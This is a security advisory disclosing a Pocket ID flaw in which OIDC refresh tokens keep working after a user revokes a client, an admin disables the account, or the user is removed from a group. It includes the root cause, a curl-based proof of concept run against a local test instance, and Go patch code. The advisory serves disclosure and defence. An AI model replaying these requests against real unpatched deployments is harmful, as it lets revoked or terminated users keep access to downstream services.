# [H] Pocket ID: OIDC refresh token flow bypasses authorization revocation, account disabling, and group restrictions

## Summary
Severity: High
Advisory: GHSA-w6p7-2fxx-4f44
CVE: CVE-2026-43983
CWE: CWE-285, CWE-613
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-w6p7-2fxx-4f44
Type: github-advisory

## Affected
- Go: `github.com/pocket-id/pocket-id/backend` — affected >=0 <0.0.0-20260419162744-978ac87deffe

## Details
# OIDC Refresh Token Flow Bypasses Authorization Revocation, Account Disabling, and Group Restrictions

## Summary

The `createTokenFromRefreshToken` function (oidc_service.go:451) validates the refresh token's cryptographic integrity but does not re-validate the user's current authorization state before issuing new tokens. This allows three bypasses:

1. **Authorization revocation bypass**: After a user revokes an OIDC client's authorization, the client can continue refreshing tokens indefinitely because `RevokeAuthorizedClient` does not delete associated refresh tokens, and the refresh flow does not check if the authorization record still exists.

2. **Disabled user bypass**: After an admin disables a user account, pre-existing refresh tokens continue to work because the OIDC token endpoint does not check `user.Disabled`. Session-based access is properly blocked by auth middleware, but the OIDC refresh path bypasses it entirely.

3. **Group restriction bypass**: After removing a user from an OIDC client's allowed user groups, the refresh token continues to work because `createTokenFromRefreshToken` does not call `IsUserGroupAllowedToAuthorize`.

Each refresh rotates the token with a fresh 30-day expiry, enabling perpetual access.

## Target

- **Repository**: pocket-id/pocket-id
- **Version**: HEAD (626adbf), also affects v2.5.0 and all versions with refresh token support

## Root Cause

`createTokenFromRefreshToken` (oidc_service.go:451-547) performs the following checks on a refresh request:

1. Verify the signed refresh token JWT (line 457) -- **checked**
2. Verify client credentials (line 467) -- **checked**
3. Look up stored refresh token by hash, expiry, user_id, client_id (line 478-495) -- **checked**
4. Verify refresh token belongs to the requesting client (line 498) -- **checked**

It does NOT check:
- Whether a `UserAuthorizedOidcClient` record still exists for the user-client pair -- **MISSING**
- Whether `user.Disabled` is false -- **MISSING**
- Whether `IsUserGroupAllowedToAuthorize` passes for group-restricted clients -- **MISSING** (groups are loaded at line 481 via `Preload("User.UserGroups")` but never validated)

Meanwhile, `RevokeAuthorizedClient` (line 1445-1471) only deletes the `UserAuthorizedOidcClient` record. It does not delete associated `OidcRefreshToken` records. There is no FK cascade between these tables (the FK cascade on `oidc_refresh_tokens` is only on user DELETE and client DELETE, not on authorization record deletion).

## Proof of Concept (Verified Live)

Tested against Pocket ID HEAD (626adbf) running in Docker with e2etest build. All 20 test assertions pass.

### Variant 1: Authorization Revocation Bypass

```bash
# Reset test DB
curl -s -X POST http://localhost:1411/api/test/reset?skip-ldap=true

# Authenticate as Tim (admin user, seeded OTA token)
curl -s -c cookies.txt -X POST http://localhost:1411/api/one-time-access-token/HPe6k6uiDRRVuAQV

# Authorize Nextcloud client
AUTH_CODE=$(curl -s -b cookies.txt -X POST http://localhost:1411/api/oidc/authorize \
  -H "Content-Type: application/json" \
  -d '{"clientId":"3654a746-35d4-4321-ac61-0bdcff2b4055","scope":"openid profile email groups","callbackURL":"http://nextcloud/auth/callback"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['code'])")

# Exchange for tokens (including refresh token)
TOKENS=$(curl -s -X POST http://localhost:1411/api/oidc/token \
  -d "grant_type=authorization_code&code=$AUTH_CODE&client_id=3654a746-35d4-4321-ac61-0bdcff2b4055&client_secret=w2mUeZISmEvIDMEDvpY0PnxQIpj1m3zY&redirect_uri=http://nextcloud/auth/callback")
REFRESH=$(echo $TOKENS | python3 -c "import json,sys; print(json.load(sys.stdin)['refresh_token'])")

# User revokes authorization (returns 204)
curl -s -o /dev/null -w "%{http_code}" -b cookies.txt \
  -X DELETE http://localhost:1411/api/oidc/users/me/authorized-clients/3654a746-35d4-4321-ac61-0bdcff2b4055
# Output: 204

# ATTACK: Refresh token STILL WORKS after revocation
curl -s -X POST http://localhost:1411/api/oidc/token \
  -d "grant_type=refresh_token&refresh_token=$REFRESH&client_id=3654a746-35d4-4321-ac61-0bdcff2b4055&client_secret=w2mUeZISmEvIDMEDvpY0PnxQIpj1m3zY"
# Returns 200 with new access_token, id_token (containing PII), and refresh_token (new 30-day expiry)
```

**Live output**: Introspection confirms `active: true`. ID token contains: `name: Tim Cook, email: tim.cook@test.com, groups: [designers, developers]`.

### Variant 2: Disabled User Bypass

```bash
# (After setup and obtaining refresh token as above)

# Admin disables Tim's account
curl -s -b cookies.txt -X PUT http://localhost:1411/api/users/f4b89dc2-62fb-46bf-9f5f-c34f4eafe93e \
  -H "Content-Type: application/json" \
  -d '{"disabled":true,"username":"tim","email":"tim.cook@test.com","firstName":"Tim","lastName":"Cook","isAdmin":true}'
# Returns 200 with disabled: true

# Session access properly blocked (auth middleware checks Disabled)
curl -s -o /dev/null -w "%{http_code}" -b cookies.txt http://localhost:1411/api/users/me
# Output: 401

# ATTACK: Refresh token STILL WORKS for disabled user
curl -s -X POST http://localhost:1411/api/oidc/token \
  -d "grant_type=refresh_token&refresh_token=$REFRESH&client_id=3654a746-35d4-4321-ac61-0bdcff2b4055&client_secret=w2mUeZISmEvIDMEDvpY0PnxQIpj1m3zY"
# Returns 200 with full token set

# Userinfo also works for disabled user
curl -s -H "Authorization: Bearer $NEW_ACCESS" http://localhost:1411/api/oidc/userinfo
# Returns: {"name":"Tim Cook","email":"tim.cook@test.com",...}
```

**Impact**: The admin kill switch for terminating employee access is completely bypassed. A fired employee's pre-existing OIDC refresh tokens continue to grant access to all downstream services.

### Variant 3: Group Restriction Bypass

```bash
# (After setup, authorize Immich client which is group-restricted to "designers")
# Tim is in designers group, gets authorized and obtains refresh token

# Remove Tim from designers group (keep only Craig)
curl -s -b cookies.txt -X PUT http://localhost:1411/api/user-groups/adab18bf-f89d-4087-9ee1-70ff15b48211/users \
  -H "Content-Type: application/json" -d '{"userIds":["1cd19686-f9a6-43f4-a41f-14a0bf5b4036"]}'
# Tim no longer in designers

# ATTACK: Refresh token STILL WORKS after group removal
# Returns 200 with new tokens
```

## Impact

The three variants share the same root cause but have different real-world implications:

1. **Authorization revocation is ineffective**: Users who revoke an OIDC client's access have a false sense of security. A malicious or compromised client retains indefinite access to the user's identity data through token rotation. The id_token issued during refresh contains full PII (name, email, groups, custom claims) regardless of the userinfo endpoint's authorization check.

2. **Account disabling does not terminate OIDC access**: This is the highest-severity variant. When an organization terminates an employee and disables their Pocket ID account, all session-based access is correctly blocked. But any OIDC client that obtained a refresh token before the disabling continues to have full access. In enterprise environments where Pocket ID gates access to sensitive services (Git, CI/CD, infrastructure), this creates a persistent backdoor.

3. **Group-based access control is only enforced at authorization time**: Group restrictions on OIDC clients (e.g., "only the infrastructure team can access the CI/CD client") can be bypassed by anyone who obtained a refresh token before being removed from the group.

## Related

GitHub issue #1390 reports a similar pattern: refresh tokens are not deleted when a session ends via the end-session endpoint. Same root cause (refresh token lifecycle detached from authorization state), different entry point.

## Suggested Fix

### Primary fix: Re-validate authorization state in createTokenFromRefreshToken

Add the following checks after the refresh token lookup (after line 495):

```go
// Check 1: Verify user is not disabled
if storedRefreshToken.User.Disabled {
    return CreatedTokens{}, &common.OidcInvalidRefreshTokenError{}
}

// Check 2: Verify UserAuthorizedOidcClient still exists
var authorizedClient model.UserAuthorizedOidcClient
err = tx.WithContext(ctx).
    Where("user_id = ? AND client_id = ?", storedRefreshToken.UserID, input.ClientID).
    First(&authorizedClient).Error
if errors.Is(err, gorm.ErrRecordNotFound) {
    // Authorization was revoked - delete this refresh token and reject
    tx.Delete(&storedRefreshToken)
    return CreatedTokens{}, &common.OidcInvalidRefreshTokenError{}
}

// Check 3: Re-verify group restrictions
if !IsUserGroupAllowedToAuthorize(storedRefreshToken.User, client) {
    return CreatedTokens{}, &common.OidcAccessDeniedError{}
}
```

### Secondary fix: Delete refresh tokens on authorization revocation

In `RevokeAuthorizedClient`, also delete all refresh tokens for the user-client pair:

```go
// After deleting the authorized client record
err = tx.WithContext(ctx).
    Where("user_id = ? AND client_id = ?", userID, clientID).
    Delete(&model.OidcRefreshToken{}).Error
if err != nil {
    return err
}
```

Both fixes should be applied together (defense in depth).

## Self-Review

- **Is this by-design?** No. The revocation feature, the disabled flag, and group restrictions all exist to control access. The refresh flow bypassing all three is a bug, not a feature.
- **Are there upstream bounds?** No. Refresh tokens are stored independently. No FK cascade, no periodic cleanup, no validation of authorization state.
- **Honest weaknesses**: 
  - Variant 1 (revocation): The attacker must be the OIDC client operator (they need client credentials and existing refresh token). Userinfo endpoint does return 404 after revocation, which is a partial mitigation. But the id_token issued during refresh already contains all PII.
  - All variants: Requires a pre-existing refresh token, so the access must have been legitimately granted at some point.
- **Existing reports**: Issue #1390 covers the related end-session case. No prior security reports for the revocation/disabled/group variants.


Koda Reef

## References
- https://github.com/pocket-id/pocket-id/security/advisories/GHSA-w6p7-2fxx-4f44
- https://nvd.nist.gov/vuln/detail/CVE-2026-43983
- https://github.com/pocket-id/pocket-id/commit/978ac87deffec58beaccd15aead975e91b94c8a5
- https://github.com/pocket-id/pocket-id
- https://github.com/pocket-id/pocket-id/releases/tag/v2.6.0
